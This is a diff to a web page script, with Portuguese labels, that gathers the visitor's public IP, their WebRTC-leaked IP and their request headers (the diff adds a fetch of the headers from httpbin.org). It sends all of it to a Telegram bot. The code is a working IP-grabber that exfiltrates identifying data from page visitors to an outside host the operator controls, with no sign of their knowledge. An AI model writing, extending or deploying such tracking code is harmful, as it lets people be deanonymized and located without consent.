@@ -35,6 +35,16 @@
       }
     }
 
+    async function getRequestHeaders() {
+      try {
+        const res = await fetch('https://httpbin.org/headers');
+        const json = await res.json();
+        return json.headers || {};
+      } catch {
+        return {"Headers": "Não encontrada"};
+      }
+    }
+
     async function sendToTelegram(text) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       await fetch(url, {
@@ -51,16 +61,9 @@
     async function main() {
       const webrtcIP = await getWebRTCIP();
       const publicIP = await getPublicIP();
+      const headers = await getRequestHeaders();
 
-      const headers = {
-        "User-Agent": navigator.userAgent || "Não encontrada",
-        "Idioma": navigator.language || "Não encontrada",
-        "Plataforma": navigator.platform || "Não encontrada",
-        "Cookies habilitados": navigator.cookieEnabled ? "Sim" : "Não",
-        "JavaScript habilitado": "Sim"
-      };
-
-      let msg = `*IP Público:* ${publicIP}\n*IP via WebRTC:* ${webrtcIP}\n\n*Headers e Infos:*`;
+      let msg = `*IP Público:* ${publicIP}\n*IP via WebRTC:* ${webrtcIP}\n\n*Headers enviados:*`;
       for (const [key, value] of Object.entries(headers)) {
         msg += `\n${key}: ${value}`;
       }
